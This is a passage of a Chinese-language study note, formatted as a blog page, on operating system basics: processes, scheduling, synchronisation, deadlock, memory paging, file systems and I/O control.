title="操作系统运行环境"></a>操作系统运行环境</h4><ul><li>CPU的运行模式：用户态和内核态，后者供给操作系统使用，以便使用一些特权指令，例如中断、IO操作等</li><li>操作系统内核功能（这个更贴近于硬件）：<ul><li>时钟管理：并发重要东东，用于计算机衡量时间</li><li>中断机制：使得CPU在进行IO操作期间可以执行其他指令，其中只有一小部分属于内核</li><li>原语：即原子性操作，不可再分割且时间较短</li><li>系统控制的数据结构及处理：接上前面说的处理器管理、文件管理、存储器管理、设备管理等</li></ul></li></ul><p>中断与异常</p><ul><li>概念：用户程序通过中断/异常来进入到核心态，执行一些特权指令。</li><li>分类：一般将外部硬件设备发出的中断叫做<strong>外中断</strong>，程序引发的诸如“除0”、“溢出”等叫做<strong>内中断</strong>或异常。</li><li><p>细分：外部中断包括可屏蔽中断（INTR）与不可屏蔽中断（NMI）；内部异常包括故障（上面说到的溢出与除0）、自陷（程序自己设置的异常模块）、终止（出现了使CPU无法继续运行的硬件故障）</p></li><li><p>处理：处理器收到来自程序的中断请求信号后，打断当前进程，之后根据信号的值查找中断向量表，并跳到相应的中断异常处理程序去执行。若该处理程序能解决则返回到原先指令或者其下一条指令，否则终止该程序</p></li></ul><p>系统调用</p><ul><li>概念：即操作系统提供给开发者的功能函数，包括但不限于设备、文件、内存管理、进程的通信与控制。当然一般来说这些调用功能运行在核心态，有些是为了安全性包装为用户态的</li><li>处理：<ol><li>用户程序将所需参数压栈，在调用指令后，执行陷入操作用于将CPU从用户态转为核心态，由硬件与操作系统将进程信息、寄存器等压栈，保护现场</li><li>分析调用类型，根据系统调用号找到对应处理子程序的入口地址</li><li>子程序执行完成后恢复现场，源程序继续向下执行（此时CPU又处于用户态）</li></ol></li></ul><h4 id="操作系统结构"><a href="#操作系统结构" class="headerlink" title="操作系统结构"></a>操作系统结构</h4><p>分层化与模块化</p><ul><li><p>分层法：也就是常说的ring环，从内向外依次增高，外层依赖于内层，【win】</p></li><li><p>模块化：一个模块对应一个功能，例如将进程管理做成单独一个模块，其下面根据功能还可以细分为子模块，【linux】</p><blockquote><p>高内聚、低耦合：指的是模块内部关联性高，模块之间的相关连程度低</p></blockquote></li></ul><p>宏内核与微内核</p><ul><li><p>主要区别：前者将系统的主要功能都作为一个整体运行在核心态，而后者则是将最基本的功能保留在内核中，剩下的移动到用户态。目前市面上的主要是这两种加在一起的混合内核</p></li><li><p>微内核：将操作系统分为微内核和服务器。</p><ul><li>微内核包括：与硬件处理相关的部分、最基本的功能（如进程管理、低级存储器管理、终端陷入处理）、客户和服务器之间的通信。</li><li>服务器：包括但不限于进程服务器、IO设备管理器、客户进程等。这样任何一个服务崩溃后不会影响其他功能</li></ul></li></ul><h4 id="操作系统引导"><a href="#操作系统引导" class="headerlink" title="操作系统引导"></a>操作系统引导</h4><ol><li>按下开关—》激活CPU—》读取ROM中的Boot程序—》指令寄存器放入BIOS的地址</li><li>BIOS程序开始在内存起始位置构建中断向量表—》之后进行通电自检查硬件</li><li>自检完成—》BIOS读取Boot Sequence—》控制权交给目标系统存储设备</li><li>加载主引导记录MBR—》获得操作系统位置—》并获取硬盘分区表</li><li>加载操作系统所在分区的引导记录PBR—》寻找并激活分区分目录下用于引导操作系统的程序—》OS，启动</li></ol><h4 id="虚拟机"><a href="#虚拟机" class="headerlink" title="虚拟机"></a>虚拟机</h4><p>利用虚拟化技术，使得一台物理机在体验上就像有多台物理机一样，特别注意不是一个机器上运行多个操作系统，而是一套硬件就像有多套硬件。</p><ul><li>第一类虚拟机管理<strong>系统</strong>：可以理解此类软件就是一个操作系统，在下面直接与硬件打交道，上面一层就是各类操作系统，例如VM ESXI、WSL2。</li><li>第二类虚拟机管理<strong>程序</strong>：理解为一个程序，运行于宿主操作系统之上，常说的虚拟机就是这个，例如VM ware</li></ul><blockquote><p>关于虚拟化、容器化和模拟可以在“数据库理论”一文中查看</p></blockquote><h3 id="进程管理"><a href="#进程管理" class="headerlink" title="进程管理"></a>进程管理</h3><h4 id="进程与线程"><a href="#进程与线程" class="headerlink" title="进程与线程"></a>进程与线程</h4><p>源代码文件编译之后成为程序，将程序加载到内存中执行就可以变为动态的进程，一个进程下面可以有多个同时进行的事件，也就是线程。</p><blockquote><p>进程是系统进行资源分配和调度的一个独立单位，线程是一个基本的CPU执行单元（也就是常说的x核x线程）</p></blockquote><p>进程基本特征：动态、并发、独立、异步</p><p>进程实体=程序段+相关数据段+进程控制块（PCB）</p><ul><li>PCB：由操作系统创建，创建后常驻内存，进程结束时删除。其中包括但不限于：进程标识符PID、用户标识符UID、进程状态优先级、内存各段相关地址、CPU上下文（即寄存器中的值）</li><li>PCB块管理有链式和索引表式，前者将同一个状态的进程PCB连接在一起，后者则是建立索引表，不同状态有不同的索引表</li></ul><p>进程的状态与转换</p><ul><li><p>运行态：正在使用CPU</p></li><li><p>就绪态：我准备好了，但是CPU还被占着</p></li><li><p>阻塞态：我没准备好，比如某个资源不可用或者在等待I/O</p></li><li><p>创建态：正在由OS第一次初始化PCB、内存空间等</p></li><li><p>终止态：进程结束后先设置为终止态，之后再由OS对资源回收</p><blockquote><p>另外还有七态模型多了挂载就绪和挂载阻塞，其实就是将这两种状态的进程内容先暂时放置在外存，而非内存中</p></blockquote></li></ul><p>进程的通信-IPC（浏览器请求打开xx网盘）</p><ul><li><p>共享存储：两个进程之间可以共享一块内存空间，通过这块两个进程都可操作的空间实现通信，需要借助同步互斥（PV操作）</p></li><li><p>消息传递：操作系统提供的消息机制，在安卓里面最为明显。进程间的数据交换以格式化的信息为单位，两个进程以系统提供的发送和接受两个原语操作进行交换</p><blockquote><p>还可以根据中间是否有信箱（实体）分为直接通信和间接通信</p></blockquote></li><li><p>管道通信：在Linux中的管道符就是其中之一，叫做匿名管道，只能实现父子进程之间的通信，而且是单向流动的。与此相对的是有名管道（一种特殊文件），因为有名所以可以实现不同进程之间的通信。需要注意管道依赖于生产消费者模型，有生产必须有消费，且互斥</p><blockquote><p>和此类似的叫做消息队列，A进程将自己需要发送的消息发送（拷贝）到系统中的队列（内核态空间）就可以走了，之后由B进程随来随查</p></blockquote></li><li><p>Socket：等于IP+Port，在网络的基础上定位另一个进程，通过包装的API实现不同进程之间的通信，当然也可以本机上两个进程如此通信（localhost）</p><blockquote><p>要注意和消息传递并不一样，Socket底层实现上和消息传递并不相同，后者依赖于特定的数据结构</p></blockquote></li><li><p>信号：和前几个不同，信号量通常用于传递少量信息，例如一个1111，可能每一位代表一个意思。Ctrl+C终止信息就是此类</p><blockquote><p>区别一下信号量，信号量通常是代码层面的变量，经常与PV操作结合实现互斥资源的访问操作</p></blockquote></li></ul><p>线程基本</p><ul><li>线程调度要远低于进程，因为不需要进行上下文切换</li><li>一个进程中有多个线程，每个线程可以有自己独立的空间，其中各个线程也有共享的空间</li><li>线程对外不可见，仅对内，并且并发执行（多核CPU可以并行）</li></ul><p>线程的组织与实现</p><ul><li><p>线程控制块TCB，包括但不限于：线程标识符、寄存器、线程运行状态、优先级、堆栈指针等。根据下面的用户内核分为内核线程控制块TCB和用户空间的UTCB</p></li><li><p>线程包括用户级线程ULT、内核级线程KLT。前者是开发者可见（Thread），一个线程被阻塞同一进程下都受影响；后者是系统可见，互相之间不影响</p><blockquote><p>线程池：预先设置好各个线程，需要的时候直接拿来用即可。相当于提前new过，只要给信息就行</p></blockquote></li><li><p>多线程模型：多对多、一对一、多对一。将用户线程与内核级线程对应起来</p></li></ul><h4 id="CPU调度"><a href="#CPU调度" class="headerlink" title="CPU调度"></a>CPU调度</h4><p>调度概念：前面我们所说的并发，一个时间段内运行多个事件，那么决定下一个时刻是哪个事件在CPU上执行就是调度，当然具体还有细节</p><ul><li>高级调度（作业调度）：将外存上后备队列中的作业中挑一个，并给他们分配内存等资源——次数少</li><li>中级调度（内存调度）：将暂时不能运行的进程放置到外存上，也就是上面说的挂载——中</li><li>低级调度（进程调度）：按照算法从就绪队列中挑一个进程放在CPU上运行——多</li></ul><p>调度实现</p><ul><li>调度程序=排队器+分派器+上下文切换器。排队器用于插入删除队列，分派器用于分配CPU，切换器用于保存移出PCB中存储的进程上下文</li><li>调度条件：新进程创建、结束、I/O阻塞发生、I/O完成使原先阻塞进程就绪</li><li>不能实行调度：处理中断时、原子操作</li><li>调度方式类型：非抢占与抢占式，也就是A正在执行时B到来，是选择让A继续还是B优先</li><li>闲逛进程：系统中没有就绪进程，就会调度这个PID=0的进程运行，不会被阻塞，仅仅是让CPU处理nop</li></ul><p>调度算法（）</p><ul><li><p>FCFS—先来先服务算法：谁先到谁就先执行，众生平等；非抢占式</p></li><li><p>SJF—短作业优先：如果本次运行完成之后，选择就绪队列中估计事情最少的进程（需要时间短）执行；默认非抢占式</p><blockquote><p>如果一直有短进程进来，比如运行时间&lt;=5，那么很早进来的$T_{A}=6$不就运行不了了，这叫做饥饿。因此单纯这个算法是非常不好，需要与后面的优先级等配合，使得等待时间越长的优先级更高</p></blockquote></li><li><p>高响应比优先调度算法：选择具有更高响应比$R_{p}=\frac{等待时间+所需时间}{所需时间}$的运行，也是对上面算法的饥饿的解决</p></li><li><p>优先级调度算法：比较广泛的说辞，优先级可以自己定，比如系统进程&gt;用户进程、I/O密集型&gt;计算密集型等、交互式&gt;非交互等。此外优先级还是可以在运行时改变的，也就因此衍生出了静态/动态优先级。可以是抢占也可以是非抢占</p></li><li><p>RR—时间片轮转调度算法：在FCFS基础上，将时间划分出一个单位，如果在该单位时间内进程运行完则提前调度，否则在单位时间结束后切换进程，将本进程仍队尾。</p></li><li><p>多级队列调度算法：每个队列可以有自己的调度算法，比如在Q1中是FCFS，Q2中是SJF等。队列之间也可以有优先级，比如设置系统队列和用户队列</p></li><li><p>多级反馈队列调度算法：在上面的队列基础上，队列之间可以有联系，即Q1出来之后可以到Q2再运行</p></li></ul><h4 id="同步与互斥"><a href="#同步与互斥" class="headerlink" title="同步与互斥"></a>同步与互斥</h4><ul><li>临界资源：在一个时刻只能有一个人占用，比如坑位</li><li>同步：直接制约关系，对于处理一件事的不同进程之间需要协调好<strong>顺序</strong></li><li>互斥：间接制约关系，A在处理时B不能干扰需要<strong>等待</strong>A完毕</li><li>准则：空闲让进、忙则等待、有限等待、让权等待</li></ul><p>临界区互斥软件实现：</p><ul><li><p>单标志：flag=0时，进程0可以进入到临界区，从中出来之后设置flag=1。但一旦0不进，1就进不去</p></li><li><p>双标先检查：当flag[0]=true表示0想进入临界区，此时1不能进，0出来之后将flag[0]=false。有可能flag[0：1]都是false，这时01就都进去了</p></li><li><p>双标后检查：类似上，但先设置flag[0]=true，之后再检查flag[1]。有可能flag[0:1]都是true，这时01都在等对方flag解锁，引起饥饿</p></li><li><p>Peterson算法：前面1、3算法合体，先设置flag[0]=true，之后设置flagg=0，再检查(flag[1]&amp;&amp;flagg==1)。没有啥大问题</p></li><li><p>互斥锁：进入临界区调用acquire来获得锁，退出临界区时调用release释放锁</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="type">void</span> <span class="title">acquire</span><span class="params">()</span></span>&#123;</span><br><span class="line"><span class="keyword">while</span>(!available)&#123;&#125;;</span><br><span class="line">available = <span class="literal">false</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">release</span><span class="params">()</span></span>&#123;</span><br><span class="line">available = <span class="literal">true</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li><li><p>信号量：一个变量S记录目前还剩资源数量，如果够的话就可以分配，否则等待<a href="https://zhuanlan.zhihu.com/p/149161327">操作系统之信号量机制 - 知乎 (zhihu.com)</a></p></li><li><p>管程：简化理解一下，管程是一个类，其中封装的关于互斥锁、共享变量等信息。也就是将一个临界资源放到了一个只有一把钥匙的房间里。<a href="https://blog.csdn.net/m0_63006478/article/details/130796059">一文搞懂操作系统中的管程-CSDN博客</a></p></li></ul><p>临界区互斥硬件实现：</p><ul><li>中断屏蔽方法：关闭中断，也就是无论如何当前进程A在临界区都不会被打断（即使除0）</li><li>硬件指令—TestAndSet：TS指令原子操作，用于读出旧值，赋true。</li><li>硬件指令—Swap：原子交换两个变量内容</li></ul><blockquote><p>经典同步问题：生产-消费者问题；读者-写者问题；吸烟问题；哲学家就餐问题；理发师问题</p></blockquote><h4 id="死锁"><a href="#死锁" class="headerlink" title="死锁"></a>死锁</h4><p>死锁的出现：现在有两个进程，A进程需要B进程目前占据的资源a，但是由于B缺少A现在占据资源b，因此不放a出来，这就出现了A等B，B等A的现象，就是死锁。其本质就是对资源的竞争。</p><blockquote><p>和饥饿区别一下，饥饿是Alice一直在等，而Bob其他人都正常，死锁则是大家都活不了</p></blockquote><p>其产生原因：对不可剥夺资源的争抢、请求释放资源的顺序不当、信号量使用不当等</p><p>死锁产生必要条件：</p><ul><li>互斥条件：本资源一个时刻下只能有一个主</li><li>不可剥夺：Alice没用完就不能给Bob</li><li>请求并保持条件：Bob需要资源a，但是不能丢掉另一个已有的需要的资源b</li><li>循环等待条件：A等B，B等C，C等A，需要成一个环</li></ul><p>死锁的处理方式：</p><ul><li><p>死锁预防：设置限制条件，使得上面的4个条件至少一个不成立</p><ul><li>破互斥：将竞争资源设置为可共享</li><li>破不可剥夺：把Alice正在用的给释放掉</li><li>破请求并保持：Bob在运行前需要一次性全部请求完，否则不能动。或者首先获取运行初期必须的，在运行过程中释放不用的东西，全释放完后才能请求新的</li><li>破坏循环等待：比如规定，PID小的拥有资源的优先权</li></ul></li><li><p>避免死锁：防止进入死锁状态</p><ul><li><p>系统安全状态：系统分配资源之前，先检查这次分配是否会进入到不安全状态。安全状态是系统按照某种顺序为各进程分配其所需，使得每个进程最终都能顺利完成，这样的顺序叫做安全序列。</p><blockquote><p>不安全状态不一定死锁，可能本来就不够；死锁一定处于不安全状态</p></blockquote></li><li><p>银行家算法：<a href="https://www.cnblogs.com/wkfvawl/p/11929508.html">操作系统——银行家算法（Banker’s Algorithm） - 王陸 - 博客园 (cnblogs.com)</a></p></li></ul></li><li><p>死锁检测与解除：时刻检测当前是否死锁，如果是就想办法解决</p><ul><li>死锁检测：资源分配图（也就是画图理清关系，具体实现可以对应到数据结构中的图）</li><li>解除：资源剥夺——挂起某些死锁进程并瓜分资源；强制撤销部分/全部死锁进程；回退到足以回避死锁的地步</li></ul></li></ul><h3 id="内存管理"><a href="#内存管理" class="headerlink" title="内存管理"></a>内存管理</h3><p>内存管理的主要功能：内存空间的分配与回收、地址转换、内存空间的扩充、内存共享、存储保护</p><ul><li><p>逻辑地址与物理地址：在32位系统上，逻辑地址/虚拟地址空间为0~2^32^-1，开发者看到的就是虚拟地址，就比如在0x100000000处，但是实际上可能内存条都没有这么长，于是乎它的物理地址可能就不在这个地方，那为什么比我内存条长嘞，这与后面虚拟内存相关</p></li><li><p>内存保护：设置进程的上下限地址寄存器；基地址寄存器+限长寄存器</p></li><li><p>内存共享：仅只读区域可以共享，不仅仅数据，也可能是动态链接库代码</p><blockquote><p>COW：copy on write写时复制技术，对于的确需要修改的自己会单独复制一份出来，原来的代码数据还是不变</p></blockquote></li></ul><h4 id="内存分配与回收"><a href="#内存分配与回收" class="headerlink" title="内存分配与回收"></a>内存分配与回收</h4><p><strong>连续分配方式</strong>：一个进程拥有一块连续的虚拟内存空间</p><ul><li>单一连续分配：内存分为系统区和用户区，用户区中仅存在一个进程</li><li>固定分区分配：将用户区分成若干个固定大小的空间，有一个分区表记录起始地址、大小及状态。注意程序所需空间可能小于所分配的区块大小，如此一来就产生了内部碎片</li><li>动态分区分配：不存在分区一说，需要多大就给多大，不够的话就选择内存中的一个进程替换。会产生外部碎片，即存在于内存中但不被分配给进程。通过紧凑操作来移动进程空间，从而合并这些外部碎片，方便其他程序<ul><li>首次适应算法：每次都从低地址到高地址，找到第一个满足条件的空间；缺点是后面的空间利用率太低</li><li>循环首次适应算法：从上一次分配空间开始，继续向下搜索，找到第一个满足条件的空间；缺点是几乎没有较大的空闲区域</li><li>最佳适应算法：空闲分区按照容量递增，找到最小的满足条件的空间；缺点是会不断产生外部碎片</li><li>最坏适应算法：空闲空间按照容量递减，找到最大的空间后切出部分空间给进程，剩下的再排队；缺点是后期大空间少</li><li>快速适应算法：在索引表中找到最小的满足条件的空间链表，之后拿出链表中的一块空间；缺点是算法杂开销大</li><li>伙伴系统：所有分区都是2^k^大小，为进程查找2^i-1^&lt;k&lt;=2^i^的空间，有则分配，无则在更高一级的链中查找，之后在这个链中将空间切半，一个插回链表合适位置，一个给进程用</li><li>哈希算法：分配时计算进程所需空间大小的hash函数，之后查找以空闲空间大小为关键字的哈希表，得到对应位置</li></ul></li></ul><p><strong>页式存储管理</strong></p><ul><li><p>页：将内存分割成若干固定大小的分区（一般都是4KB）叫做页框/页帧/物理块，进程的逻辑空间也同理分成此类若干区域叫做页/页面。逻辑空间页面编号—页号，物理空间编号—页框号/物理块号</p></li><li><p>页表：为了将逻辑空间与物理空间编号一一对应，于是就有了页表，每个进程都有自己独特的页表，注意页号是不需要存储空间的，ex：page_table[0]=2。而这个页表的位置与长度一般有专门的页表寄存器存储，当进程运行时，系统会将该进程PCB中对应的相关内容赋值到页表寄存器中，这个过程一般由内存管理单元MMU执行</p></li><li><p>快表：从上面我们知道，现在需要先查找页表后才能知道目标空间在哪里，为了加快速率，就有了快表TLB。地址转换时会先在一个高速缓冲存储器查找该表（仅部分项），没有的话再去查找内存中的页表，之后更新快表（时间局部性）</p><blockquote><p>注意快表中的页号显然不具有连续性，因此需要额外空间存储&lt;页号，块号&gt;</p></blockquote></li><li><p>两级页表：页表项太多了，需要占据不少空间，因此有了页目录。页目录中存储各个页表的起始位置。页目录的位置存放在CR3寄存器中<a href="https://blog.csdn.net/SweeNeil/article/details/106171361">X86_64 CR3控制寄存器详解_cr3 process context identifier-CSDN博客</a></p></li></ul><p>段式存储管理</p><ul><li><p>段：将用户的逻辑地址分为大小不等的段，比如代码段、数据段、堆栈段等，段内连续段间可以不连续。</p><blockquote><p>注意这里的段和PE/ELF文件中的段不一样，这里的是在内存中的段。比如进程分了一些内存空间，其中某些地方是数据段，那么对应PE/ELF文件中的相关数据就要放置在这些地方</p></blockquote></li><li><p>段表：段号:&lt;段长，本段在主存的地址&gt;。段表起始地址和长度存放在段表寄存器中</p></li></ul><p>段页式存储管理：顾名思义前两种的结合，进程的逻辑空间首先被分成段，每个段有自己的段号，之后根据段号到页表中查询&lt;页表长度，页表起始地址&gt;，一个段表寄存器存储段表位置与长度，每个进程都有一个段表，每个段都有一个页表，</p><h4 id="虚拟内存管理"><a href="#虚拟内存管理" class="headerlink" title="虚拟内存管理"></a>虚拟内存管理</h4><p>为什么要虚拟内存：假如现在有个2GB的内存条，可能塞个win11就满了，这样其他程序就无法运行了，所以虚拟内存的任务就是解决内存不充足的问题。</p><p>什么是虚拟内存：虚拟内存是建立了内存-外存的存储器结构，利用时间/空间局部性原理从而实现高速缓存。之所以叫做虚拟是因为这个东西不是硬件，而是软件层面的实现。</p><p>虚拟内存执行过程：其基于上述局部性原理，在进程装入时仅装入部分需要用到的内容，而非所有，当需要的时候再从内存中腾出空间将还在外存中需要的东西放置到内存去，这个过程叫请求调页。如果内存空间不足，则需要将内存中某几页进行替换，这叫做页面置换。</p><blockquote><p>并非整个外存都属于虚拟内存，其中用于上述功能的外存区域叫做交换区。win下：高级系统设置—高级—性能设置中更改；Linux下的<code>swapon</code>用于开启虚拟内存。内存下的集合叫做驻留集</p></blockquote><p>虚拟内存的实现：请求分页/分段/段页式存储管理。下面我们主要讲请求分页式存储管理</p><p>请求分页式存储管理：</p><ul><li><p>在页式存储管理上增加了请求调页和页面调换的功能</p></li><li><p>需要在页表中添加：<em>状态位</em>来查看本页是否在内存，<em>访问字段</em>记录在一段时间内的访问次数，<em>修改位</em>标记在加入内存后是否有改动，<em>外存地址</em></p></li><li><p>缺页中断：当所需访问页面不在内存中时引起，有OS的缺页中断处理程序处理，并将原进程阻塞，之后执行请求调页或是页面替换。</p><blockquote><p>在页面替换时，如果被替换下来的页修改过，则需要将修改同步到外存</p></blockquote></li></ul><p>内存分配策略</p><ul><li><p>固定分配局部置换：每个进程固定N个物理块，若发生缺页则仅在本进程分配的块中选择置换</p><blockquote><p>固定分配时可以有如下方式设置N的大小：平均分配、按进程大小成比例分配、优先权分配</p></blockquote></li><li><p>可变分配全局置换：先分配M个物理块，进程运行期间可以看情况适当增加或减少，发生缺页则可以从其他空闲物理块中调入</p></li><li><p>可变分配局部置换：先分配M个块（运行时可增减块数），发生缺页则只能从M个中换出</p></li></ul><p>调页面</p><ul><li>何时调入页面：预调页策略、请求调页策略</li><li>何处调页：可能改变的放在交换区空间、不会改的放在文件区、与进程有关的放在文件区，被换出的放在交换区</li><li>如何调：所访问页面不存在——》缺页中断——》转入缺页中断处理程序——》查找页表得到物理块——》内存未满则调入内存并修改页表——内存满则选择置换算法换出——》若待换出被改则需写回磁盘，之后再调换并修改页表</li></ul><p>局部页面置换算法</p><ul><li><p>最佳置换算法OPT：选择以后最长时间内都不用的替换。仅适用于做题，因为无法预知</p></li><li><p>先进先出页面置换算法FIFO：淘汰最早进入内存的页面，基于队列实现。会有Belady异常</p><blockquote><p>Belady异常：当分配的物理块增多时，缺页次数增多</p></blockquote></li><li><p>最近最久未使用置换算法LRU：向前看最长时间没有被使用的进行替换，性能较好。基于堆栈实现，需要硬件加持</p></li><li><p>最不常用算法LFU：每个页面设一个计数器，调用时+1，替换时选择内存中计数器值最小的替换</p></li><li><p>时钟置换算法CLOCK/最近未使用算法NUR：每个页面一个访问位A=1，所有页面形成一个环。有空时则直接加入，没空时则向后检查访问位，A=1则置A=0，A=0则替换</p></li><li><p>改进的CLOCK/二次机会法：在CLOCK基础上增加了修改位M，{A=1,M=1} &gt; {A=1, M=0} &gt; {A=0,M=1} &gt; {A=0,M=0}。</p><ul><li>第一次扫描一圈若有{A=0,M=0}则替换，并不改变A</li><li>第二轮找{A=0,M=1}并将访问过的A置0</li><li>第三轮则将所有A置0重复第一轮/第二轮</li></ul></li></ul><p>全局页面置换<a href="https://zhuanlan.zhihu.com/p/649722046">工作集算法（动态页面替换算法，不同于FIFO、LRU、MRU和LFU算法—静态） - 知乎 (zhihu.com)</a></p><ul><li>抖动：也叫颠簸，指的是刚刚换出去的页面又要马上换入内存，刚换入的页面又要马上换出内存。其根本原因是分配给每个进程的物理块数太少</li><li>工作集：某段时间内进程要访问的页面的集合，其反应了接下来一段时间内有可能访问的页面的集合，因此驻留集不能小于工作集</li></ul><h3 id="文件管理"><a href="#文件管理" class="headerlink" title="文件管理"></a>文件管理</h3><p>文件系统中包含目录是用于实现文件的管理，目录则是对文件的索引，目录也可以是一个文件</p><h4 id="文件"><a href="#文件" class="headerlink" title="文件"></a>文件</h4><ul><li><p>属性/元数据：并非文件内容，而是由OS创建的信息，例如文件名称、所属者、创建时间等</p></li><li><p>文件控制块FCB：存放该文件的相关信息，并非文件内容。主要包含文件名、存取控制信息等元数据</p><blockquote><p>通常我们都是用文件名来找到对应文件，而在UNIX中，根据文件名找到对应的索引节点（其中存放其他元数据）编号</p></blockquote></li><li><p>文件的操作：创建（分配空间并创建目录项）、删除（查目录项后删除空间）、读写（目录项中有对应指针）、打开、关闭</p><ul><li>打开&amp;关闭：系统在内存中有一个打开目录表，将对应文件目录项放入后返回文件描述符给程序，方便后续操作。系统和进程都有上述表，前者存放的是与进程无关的信息，后者存放诸如读写指针、访问权限等信息。如果打开多次则会在打开计数器中++，关闭时会—，并删除进程中的目录表，为0时从系统表中删除</li></ul></li><li><p>文件保护：</p><ul><li>一般访问权限：可读、可写、可执行、添加、删除、列出信息</li><li>访问控制：通过访问控制列表ACL来记录用户等对文件或目录的上述权限有哪些</li><li>口令密码：防止他人存取</li></ul></li><li><p>文件的逻辑结构：即数据在逻辑上是如何组织起来的。首先可以分为流式文件和记录式文件/有结构文件，前者仅以读写指针来指出访问对象。后者按照记录的组织形式又可以分为下面几种</p><ul><li>顺序文件：文件中的记录按照顺序排列，记录可以是变长或者定长</li><li>索引文件：建立一个索引表，其中包含&lt;索引号，记录长度，记录的起始指针&gt;</li><li>索引顺序文件：顺序文件中的所有记录分为若干个组，之后建立一张索引表，在索引表中有每组&lt;起始记录键值，对应指针&gt;</li><li>直接文件/散列文件：散列函数转换的键值直接决定记录的物理地址</li></ul><blockquote><p>这个概念相对抽象，并非文件系统中的组织方式，而是用户可以自己操作的</p></blockquote></li><li><p>文件的物理结构：在磁盘中存储的东西，用户看不见</p><ul><li>连续分配：文件在磁盘上占据连续的一组块</li><li>链接分配：目录中有第一块的指针，第一块内容中存储着第二块的指针（隐式链接）；对于显示链接则是将上述指针都放在一个地方</li><li>索引分配：拿出一个块存集中存放该文件占据的各个块，也可以在此基础上实现多级索引。混合索引则是某些块为直接块用于直接指向数据，剩下的采用一级、多级索引分配</li></ul></li></ul><h4 id="目录"><a href="#目录" class="headerlink" title="目录"></a>目录</h4><ul><li>目录：FCB的有序集合</li><li>目录结构<ul><li>单级目录结构：一个系统一张目录表，每个文件只占一个目录项</li><li>两级目录结构：主文件目录和用户文件目录两级，主文件目录指出用户A对应哪个用户文件目录，之后按照单级目录</li><li>树形目录结构：不止两级，按照树形式，多叉多层，必定有个根目录</li><li>无环图目录结构：在树的基础上可以实现叶子间的联系，但不形成环，类似于快捷方式</li></ul></li><li>目录的操作：搜索、删除/创建文件、创建删除目录、移动、显示、修改目录</li><li>目录的实现：线性列表&lt;文件名，数据块指针&gt;、哈希表</li><li>基于无环图目录结构实现文件共享（下面以Linux下实现为准）<ul><li>硬链接：两个文件目录下对应一个inode节点，其中的计数器++，inode对应真正的文件</li><li>软链接：在本目录下指向一个inode，其指向一个文件，这个文件内容是链接文件的地址，因此删除这个链接不会删除目标文件</li></ul></li></ul><h4 id="文件系统"><a href="#文件系统" class="headerlink" title="文件系统"></a>文件系统</h4><ul><li><p>啥是文件系统：如何在磁盘上布局文件，如何提供操作，其实现的算法数据结构怎样</p></li><li><p>文件系统结构：设备——》I/O控制——》基本文件系统——》文件组织模块——》逻辑文件系统</p><ul><li>I/O控制层：用于在内存和磁盘之间传输信息</li><li>基本文件系统：向设备驱动发送命令，并管理内存缓冲区</li><li>文件组织模块：组织文件及其逻辑块和物理块</li><li>逻辑文件系统：管理文件系统的元数据信息</li></ul></li><li><p>外存空闲空间管理：空闲表法（单独建个表记录空白）、空闲链表法（空闲区拉成一条链）、位视图法（按位表示相应块是否空白-0=空）、成组链接法（空闲表的其中部分直接指向空白块，其中一个指向另一个此类空闲表）</p></li><li><p>虚拟文件系统：一个分区可以有一种文件系统，那么os内核如何统一操作不同的文件系统嘞，就在其中加入了VFS（虚拟文件系统），来消除这种差异，使得OS可以向开发者提供统一的调用函数</p><blockquote><p>VFS在Linux中实现很清晰，其中更是有四大对象【超级块-文件系统元数据、目录-记录文件、文件-具体文件、索引节点-inode】<a href="https://stemha.github.io/2020/08/12/Linux-VFS中的数据结构/">Linux-VFS中的数据结构 - STEMHA’s Blog</a></p></blockquote></li></ul><h3 id="输入-输出管理"><a href="#输入-输出管理" class="headerlink" title="输入/输出管理"></a>输入/输出管理</h3><p>I/O设备是指可以将数据输入计算机的外部设备，或者可以接受计算机输出数据的外部设备</p><h4 id="I-O管理基本"><a href="#I-O管理基本" class="headerlink" title="I/O管理基本"></a>I/O管理基本</h4><p>I/O设备的分类</p><ul><li>按照信息交换单位分类：块设备（磁盘）、字符设备（打印机）</li><li>按照传输速率分类：低速（键盘鼠标）、中速（打印机）、高速（磁盘内存）</li><li>使用特性分类：存储设备、输入输出设备</li><li>按照共享属性分类：独占设备、共享、虚拟设备（借助SPOOLing可以将独占设备改为共享设备）</li></ul><p>I/O接口：又叫做设备控制器，是CPU与设备打交道的中间桥梁，一个设备控制器可以连接多个设备。其中的寄存器又叫做I/O端口，通过编址后能够直接被CPU访问的寄存器，主要有数据、状态、控制寄存器。编址方式有独立编址（每个端口一个I/O编号，可以和内存地址重叠）、统一编址（主存地址一部分划给I/O）</p><p>I/O接口按照数据传送方式分为并行接口和串行接口。具有阻塞和非阻塞两种模式。按照主机的访问I/O设备的控制方式有以下几种：</p><ul><li><p>程序直接控制方式/轮询：CPU向设备控制器发送读命令，之后循环检查其状态</p></li><li><p>中断驱动方式：I/O设备主动发送中断信号来让CPU读取</p></li><li><p>DMA接口：DMA（直接存储器存取）作为一种硬件，能过够避开CPU，直接与内存打交道从而实现I/O与内存直接交互。当传送一个或多个数据块时需要CPU干预</p><blockquote><p>为实现上述“代理人”的效果，至少需要DMA中有命令状态寄存器CR（接收CPU信息）、内存地址寄存器MAR（存放映射/目标地址）、数据寄存器DR（暂存数据）、数据计数器DC（传输字节数）</p></blockquote></li><li><p>通道控制方式：设置通道后，根据CPU的I/O指令及相关信息，执行通道程序完成规定I/O任务，之后再以中断方式提醒CPU处理。软件实现还是处于内存里面，一个通道就可以处理多个I/O</p></li></ul><p>I/O软件层次结构</p><ul><li>用户层软件：例如系统的open()和read()等接口</li><li>设备独立性软件：将不同的设备操作接口相统一</li><li>设备驱动程序：具体实现系统对设备的操作，根据设备不同而异</li><li>中断处理程序：用于保存中断进程的CPU环境与上下文切换等工作</li></ul><h4 id="设备独立性"><a href="#设备独立性" class="headerlink" 